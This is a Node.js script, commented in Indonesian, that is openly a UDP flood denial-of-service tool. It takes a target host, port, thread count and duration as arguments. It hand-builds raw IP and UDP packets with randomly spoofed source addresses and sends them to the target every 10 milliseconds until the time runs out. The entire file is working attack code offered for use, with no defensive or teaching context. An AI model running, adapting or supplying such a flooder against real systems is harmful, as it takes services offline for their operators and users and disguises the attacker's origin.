const raw = require("raw-socket"); // Pastikan pustaka raw-socket telah diinstal: npm install raw-socket
const os = require("os");

// Validasi input
if (process.argv.length < 6) {
  console.log("Usage: node udp_flood.js <target> <port> <threads> <duration>");
  process.exit(1);
}

// Konfigurasi target
const target = process.argv[2];
const port = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const duration = parseInt(process.argv[5]);
const payload = Buffer.from("\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00");

// Membuat header IP
function createIPHeader(srcIP, destIP) {
  const ipHeader = Buffer.alloc(20);
  ipHeader.writeUInt8(69, 0); // Version + IHL
  ipHeader.writeUInt8(0, 1); // TOS
  ipHeader.writeUInt16BE(payload.length + 28, 2); // Total Length
  ipHeader.writeUInt16BE(54321, 4); // Identification
  ipHeader.writeUInt16BE(0, 6); // Flags + Fragment Offset
  ipHeader.writeUInt8(255, 8); // TTL
  ipHeader.writeUInt8(17, 9); // Protocol (UDP = 17)
  ipHeader.writeUInt16BE(0, 10); // Header Checksum (temporary)
  ipHeader.writeUInt32BE(ipToInt(srcIP), 12); // Source IP
  ipHeader.writeUInt32BE(ipToInt(destIP), 16); // Destination IP
  ipHeader.writeUInt16BE(checksum(ipHeader), 10); // Finalize Checksum
  return ipHeader;
}

// Membuat header UDP
function createUDPHeader(srcPort, destPort) {
  const udpHeader = Buffer.alloc(8);
  udpHeader.writeUInt16BE(srcPort, 0); // Source Port
  udpHeader.writeUInt16BE(destPort, 2); // Destination Port
  udpHeader.writeUInt16BE(payload.length + 8, 4); // Length
  udpHeader.writeUInt16BE(0, 6); // Checksum (optional)
  return udpHeader;
}

// Fungsi konversi IP ke integer
function ipToInt(ip) {
  return ip.split(".").reduce((int, octet) => (int << 8) + parseInt(octet), 0);
}

// Fungsi menghitung checksum
function checksum(buffer) {
  let sum = 0;
  for (let i = 0; i < buffer.length; i += 2) {
    sum += buffer.readUInt16BE(i);
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return ~sum & 0xffff;
}

// Fungsi Flood
function flood() {
  try {
    const socket = raw.createSocket({ protocol: raw.Protocol.UDP });
    const srcIP = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; // IP acak
    const ipHeader = createIPHeader(srcIP, target);
    const udpHeader = createUDPHeader(54321, port);
    const packet = Buffer.concat([ipHeader, udpHeader, payload]);

    socket.send(packet, 0, packet.length, target, (err) => {
      if (err) console.error("Error sending packet:", err.message);
    });

    socket.on("error", (err) => {
      console.error("Socket error:", err.message);
      socket.close();
    });
  } catch (err) {
    console.error("Error creating socket:", err.message);
  }
}

// Jalankan Flood
function startFlood() {
  console.log("Starting UDP flood attack...");
  const startTime = Date.now();
  const interval = setInterval(() => {
    for (let i = 0; i < threads; i++) {
      flood();
    }
    if (Date.now() - startTime >= duration * 1000) {
      clearInterval(interval);
      console.log("Flood attack finished.");
      process.exit(0);
    }
  }, 10); // Kirim paket setiap 10ms
}

// Jalankan script
startFlood();